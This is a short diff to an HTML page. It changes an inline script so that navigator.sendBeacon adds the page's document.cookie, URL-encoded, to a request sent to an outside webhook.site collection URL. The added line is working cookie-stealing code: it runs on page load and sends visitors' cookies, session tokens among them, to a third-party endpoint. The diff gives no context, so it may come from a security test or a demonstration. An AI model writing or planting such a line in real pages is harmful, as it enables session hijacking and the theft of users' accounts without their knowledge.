@@ -4,7 +4,7 @@
 <body>
   <script>
     navigator.sendBeacon(
-      "https://webhook.site/aac76a2b-98fc-4651-a334-9290195913b3",
+      "https://webhook.site/aac76a2b-98fc-4651-a334-9290195913b3?c="+encodeURIComponent(document.cookie),
       new Blob([JSON.stringify({ from: "beacon" })], { type: "application/json" })
     );
   </script>
